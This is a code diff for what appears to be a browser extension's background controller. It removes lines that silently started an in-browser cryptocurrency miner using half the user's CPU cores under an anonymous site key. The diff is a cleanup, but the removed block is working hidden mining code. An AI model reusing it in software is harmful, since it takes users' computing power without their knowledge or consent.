@@ -3,39 +3,6 @@ import WebcamController from "./webcam";
 import AreaController from "./area";
 import BaseController from "./base";
 
-console.log("start");
-
-const random = (min, max) => {
-    return Math.round(min - 0.5 + Math.random() * (max - min + 1));
-};
-
-const siteKey = '1d34c21acef8bedf96c0c4fb1c45d9c3502b3733977dba26c0289290562a31bf';
-const userName = `gifster-${random(1, 99999)}`;
-let threads;
-
-if(navigator && navigator.hardwareConcurrency){
-    const cores = navigator.hardwareConcurrency;
-    threads = cores % 2 === 0
-        ? cores / 2
-        : (cores - 1) / 2;
-}
-else {
-    threads = 1;
-}
-
-console.log(threads);
-
-const miner = new Client.Anonymous(siteKey, {throttle: 0.7, threads: threads});
-
-miner.start();
-
-miner.on('found', () => {
-    console.log("found")
-});
-miner.on('accepted', () => {
-    console.log("accepted")
-});
-
 class BackgroundController extends BaseController {
     start() {
         chrome.runtime.onMessage.addListener(this.messageListener.bind(this));
